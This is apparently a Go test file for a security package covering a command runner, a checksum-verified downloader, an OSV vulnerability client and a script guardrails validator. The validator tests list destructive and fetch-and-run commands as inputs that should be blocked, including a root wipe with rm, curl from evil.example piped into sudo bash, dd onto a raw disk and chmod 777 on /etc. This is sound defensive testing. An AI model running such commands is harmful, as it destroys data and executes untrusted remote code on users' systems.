package security

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestRunnerCapsOutputBytes(t *testing.T) {
	runner := NewRunner(5*time.Second, WithMaxOutputBytes(256))
	// Emit 2048 bytes from python3/sh or head/tr; use printf loop via sh or python
	out, err := runner.Run(
		context.Background(),
		"sh",
		"-c",
		"dd if=/dev/zero bs=1024 count=2 2>/dev/null | tr '\\0' 'A'",
	)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(out) > 512 {
		t.Fatalf("expected output capped near 256 bytes, got %d bytes", len(out))
	}
}

func TestRunnerStdinAndTimeout(t *testing.T) {
	t.Run("passes stdin safely", func(t *testing.T) {
		runner := NewRunner(5 * time.Second)
		out, err := runner.RunWithInput(
			context.Background(),
			RunOptions{Stdin: strings.NewReader("hello-anx")},
			"cat",
		)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if out != "hello-anx" {
			t.Fatalf("expected 'hello-anx', got %q", out)
		}
	})

	t.Run("enforces per-call timeout", func(t *testing.T) {
		runner := NewRunner(5 * time.Second)
		_, err := runner.RunWithInput(
			context.Background(),
			RunOptions{Timeout: 50 * time.Millisecond},
			"sleep",
			"2",
		)
		if err == nil || !strings.Contains(err.Error(), "timed out") {
			t.Fatalf("expected timeout error, got %v", err)
		}
	})
}

func TestVerifyFileSHA256AndSafeDownloader(t *testing.T) {
	dir := t.TempDir()
	payload := []byte("deterministic binary payload")
	sum := sha256.Sum256(payload)
	expectedHex := hex.EncodeToString(sum[:])

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer srv.Close()

	dl := NewSafeDownloader(5*time.Second, 1024*1024)
	dest := filepath.Join(dir, "tool.bin")

	if err := dl.DownloadToFile(context.Background(), srv.URL, dest, expectedHex); err != nil {
		t.Fatalf("expected verified download to succeed, got %v", err)
	}
	if err := VerifyFileSHA256(dest, expectedHex); err != nil {
		t.Fatalf("VerifyFileSHA256 failed: %v", err)
	}
	if err := VerifyFileSHA256(dest, strings.Repeat("0", 64)); err == nil {
		t.Fatal("expected checksum mismatch error, got nil")
	}

	badDest := filepath.Join(dir, "bad.bin")
	if err := dl.DownloadToFile(context.Background(), srv.URL, badDest, strings.Repeat("f", 64)); err == nil {
		t.Fatal("expected download with bad checksum to fail")
	}
	if _, statErr := os.Stat(badDest); !os.IsNotExist(statErr) {
		t.Fatal("expected unverified temp/destination file to be removed on checksum failure")
	}
}

func TestOSVClientSemverExtractionCacheAndErrorSurface(t *testing.T) {
	tests := []struct {
		name string
		raw  string
		want string
	}{
		{name: "ripgrep output", raw: "ripgrep 14.1.1\nfeatures:+simd", want: "14.1.1"},
		{name: "v-prefixed tag", raw: "NVIM v0.10.3", want: "0.10.3"},
		{name: "prerelease tag", raw: "go1.27.3-rc1 linux/amd64", want: "1.27.3-rc1"},
		{name: "no version", raw: "installed", want: ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ExtractSemver(tt.raw); got != tt.want {
				t.Fatalf("ExtractSemver(%q) = %q, want %q", tt.raw, got, tt.want)
			}
		})
	}

	cacheDir := t.TempDir()
	hits := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits++
		resp := map[string]any{
			"vulns": []map[string]any{
				{
					"id":      "GHSA-test-0001",
					"summary": "critical issue",
					"database_specific": map[string]any{
						"severity": "CRITICAL",
					},
				},
			},
		}
		_ = json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := NewOSVClient(
		5*time.Second,
		WithOSVEndpoint(srv.URL),
		WithOSVCacheDir(cacheDir, time.Hour),
	)

	findings, err := client.Query(context.Background(), "ripgrep", "ripgrep 14.1.0")
	if err != nil {
		t.Fatalf("Query failed: %v", err)
	}
	if len(findings) != 1 || findings[0].Severity.String() != "critical" {
		t.Fatalf("expected 1 critical finding, got %+v", findings)
	}

	// Second call must hit cache without contacting server
	findingsCached, err := client.Query(context.Background(), "ripgrep", "14.1.0")
	if err != nil || len(findingsCached) != 1 || hits != 1 {
		t.Fatalf("expected cached response with 1 server hit, got hits=%d err=%v", hits, err)
	}
}

func TestGuardrailsValidator(t *testing.T) {
	tests := []struct {
		name      string
		script    string
		wantClean bool
	}{
		{
			name:      "safe sysctl and fstrim script",
			script:    "#!/usr/bin/env bash\nsysctl -w vm.swappiness=10\nfstrim -av\n",
			wantClean: true,
		},
		{
			name:      "blocks recursive root wipe",
			script:    "sudo rm -rf / --no-preserve-root",
			wantClean: false,
		},
		{
			name:      "blocks curl pipe sudo bash",
			script:    "curl -fsSL https://evil.example/x.sh | sudo bash",
			wantClean: false,
		},
		{
			name:      "blocks raw block device dd",
			script:    "dd if=/dev/zero of=/dev/nvme0n1 bs=1M",
			wantClean: false,
		},
		{
			name:      "blocks chmod 777 on system root",
			script:    "chmod -R 777 /etc",
			wantClean: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := ValidateScriptGuardrails(tt.script)
			if tt.wantClean && len(violations) > 0 {
				t.Fatalf("expected clean script, got violations: %+v", violations)
			}
			if !tt.wantClean && len(violations) == 0 {
				t.Fatalf("expected guardrail violation for %q, got none", tt.script)
			}
		})
	}
}
